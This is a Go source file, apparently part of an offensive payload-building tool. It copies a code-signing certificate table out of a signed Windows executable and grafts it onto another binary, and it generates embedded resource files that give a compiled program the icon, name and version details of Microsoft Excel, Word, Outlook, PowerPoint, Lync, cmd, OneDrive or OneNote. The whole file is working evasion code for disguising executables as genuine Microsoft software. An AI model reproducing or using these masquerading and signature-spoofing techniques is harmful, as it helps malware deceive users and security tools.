package core

import (
	"fmt"
	"github.com/Binject/debug/pe"
	"github.com/josephspurrier/goversioninfo"
	"io"
	"io/ioutil"
	"log"
	"os"
)

func savecert(sigexe string, dstcert string) {
	cert := getcert(sigexe)
	ioutil.WriteFile(dstcert, cert, os.ModePerm)
}

func getcert(sigexe string) []byte {
	pefile, _ := pe.Open(sigexe)
	defer pefile.Close()
	if string(pefile.CertificateTable) == "" {
		log.Fatal("ERROR!Certfile Not signed! ")
	}
	return pefile.CertificateTable
}

func writecertfromdisk(outputloc string, inputloc string, cert string) {
	certfile, _ := ioutil.ReadFile(cert)
	appendcert(outputloc, inputloc, certfile)
}

func writecertfromexe(outputloc string, inputloc string, certfileloc string) {
	certfile := getcert(certfileloc)
	appendcert(outputloc, inputloc, certfile)
}

func appendcert(outputloc string, inputloc string, cert []byte) {
	pefile, _ := pe.Open(inputloc)
	defer pefile.Close()
	pefile.CertificateTable = cert
	pefile.WriteFile(outputloc)
}

//goenviroment
func FileProperties(name string, configFile string) string {
	Binaryname := []string{"Excel", "Word", "Outlook", "Powerpnt", "lync", "cmd", "OneDrive", "OneNote"}
	fmt.Println("[*] Creating an Embedded Resource File")
	vi := &goversioninfo.VersionInfo{}
	if configFile != "" {
		var err error
		input := io.ReadCloser(os.Stdin)
		if input, err = os.Open("../" + configFile); err != nil {
			log.Printf("Cannot open %q: %v", configFile, err)
			os.Exit(3)
		}
		jsonBytes, err := ioutil.ReadAll(input)
		input.Close()
		if err != nil {
			log.Printf("Error reading %q: %v", configFile, err)
			os.Exit(3)
		}
		if err := vi.ParseJSON(jsonBytes); err != nil {
			log.Printf("Could not parse the .json file: %v", err)
			os.Exit(3)
		}
		name = vi.StringFileInfo.InternalName
	} else if configFile == "" {
		if name == "OneNote" {
			vi.IconPath = "onenote.ico"
			vi.StringFileInfo.InternalName = "OneNote"
			vi.StringFileInfo.FileDescription = "Microsoft OneNote"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.FileVersion = "16.0.14326.20404"
			vi.StringFileInfo.OriginalFilename = "OneNote.exe"
			vi.StringFileInfo.ProductName = "Microsoft OneNote"
			vi.StringFileInfo.ProductVersion = "16.0.14326.20404"
			vi.FixedFileInfo.FileVersion.Major = 16
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 14326
			vi.FixedFileInfo.FileVersion.Build = 20404
			vi.StringFileInfo.InternalName = "OneNote"
		} //
		if name == "Excel" {
			vi.IconPath = "excel.ico"
			vi.StringFileInfo.InternalName = "Excel"
			vi.StringFileInfo.FileDescription = "Microsoft Excel"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.FileVersion = "16.0.14326.20404"
			vi.StringFileInfo.OriginalFilename = "Excel.exe"
			vi.StringFileInfo.ProductName = "Microsoft Office"
			vi.StringFileInfo.ProductVersion = "16.0.14326.20404"
			vi.FixedFileInfo.FileVersion.Major = 16
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 14326
			vi.FixedFileInfo.FileVersion.Build = 20838
			vi.StringFileInfo.InternalName = "Excel"
		} //
		if name == "Word" {
			vi.IconPath = "word.ico"
			vi.StringFileInfo.InternalName = "Word"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.FileVersion = "16.0.14326.20404"
			vi.StringFileInfo.OriginalFilename = "Word.exe"
			vi.StringFileInfo.ProductName = "Microsoft Office"
			vi.StringFileInfo.ProductVersion = "16.0.14326.20404"
			vi.FixedFileInfo.FileVersion.Major = 16
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 14326
			vi.FixedFileInfo.FileVersion.Build = 20404
			vi.StringFileInfo.InternalName = "Word"
		} //
		if name == "Powerpnt" {
			vi.IconPath = "powerpoint.ico"
			vi.StringFileInfo.FileDescription = "Microsoft PowerPoint"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.FileVersion = "16.0.14326.20404"
			vi.StringFileInfo.OriginalFilename = "Powerpnt.exe"
			vi.StringFileInfo.ProductName = "Microsoft Office"
			vi.StringFileInfo.ProductVersion = "16.0.14326.20404"
			vi.FixedFileInfo.FileVersion.Major = 16
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 14326
			vi.FixedFileInfo.FileVersion.Build = 20404
			vi.StringFileInfo.InternalName = "Powerpnt"
		} //
		if name == "Outlook" {
			vi.IconPath = "outlook.ico"
			vi.StringFileInfo.InternalName = "Outlook"
			vi.StringFileInfo.FileDescription = "Microsoft Outlook"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.FileVersion = "16.0.14326.20404"
			vi.StringFileInfo.OriginalFilename = "Outlook.exe"
			vi.StringFileInfo.ProductName = "Microsoft Office"
			vi.StringFileInfo.ProductVersion = "16.0.14326.20404"
			vi.FixedFileInfo.FileVersion.Major = 16
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 14326
			vi.FixedFileInfo.FileVersion.Build = 20404
			vi.StringFileInfo.InternalName = "Outlook"
		} //
		if name == "lync" {
			vi.IconPath = "lync.ico"
			vi.StringFileInfo.InternalName = "Lync"
			vi.StringFileInfo.FileDescription = "Skype for Business"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.FileVersion = "16.0.14326.20404"
			vi.StringFileInfo.OriginalFilename = "Lync.exe"
			vi.StringFileInfo.ProductName = "Microsoft Office"
			vi.StringFileInfo.ProductVersion = "16.0.14326.20404"
			vi.FixedFileInfo.FileVersion.Major = 16
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 14326
			vi.FixedFileInfo.FileVersion.Build = 20404
			vi.StringFileInfo.InternalName = "Lync"
		} //
		if name == "cmd" {
			vi.IconPath = "cmd.ico"
			vi.StringFileInfo.InternalName = "Cmd.exe"
			vi.StringFileInfo.FileDescription = "Windows Command Processor"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.FileVersion = "10.0.19041.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.OriginalFilename = "Cmd.exe"
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.19041.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 1
			vi.FixedFileInfo.FileVersion.Build = 19041
			vi.StringFileInfo.InternalName = "Cmd.exe"
		} //
		if name == "OneDrive" {
			vi.IconPath = "onedrive.ico"
			vi.StringFileInfo.InternalName = "OneDrive.exe"
			vi.StringFileInfo.FileDescription = "Microsoft OneDrive"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.FileVersion = "21.170.0822.0002"
			vi.StringFileInfo.OriginalFilename = "OneDrive.exe"
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "21.170.0822.0002"
			vi.FixedFileInfo.FileVersion.Major = 21
			vi.FixedFileInfo.FileVersion.Minor = 170
			vi.FixedFileInfo.FileVersion.Patch = 2
			vi.FixedFileInfo.FileVersion.Build = 822
			vi.StringFileInfo.InternalName = "OneDrive.exe"
		} //
	}

	vi.StringFileInfo.CompanyName = "Microsoft Corporation"

	vi.Build()
	vi.Walk()

	var archs []string
	archs = []string{"amd64"}
	for _, item := range archs {
		fileout := "resource_windows.syso"
		if err := vi.WriteSyso(fileout, item); err != nil {
			log.Printf("Error writing syso: %v", err)
			os.Exit(3)
		}
	}
	fmt.Println("[+] Created Embedded Resource File With " + name + "'s Properties")
	return name
}
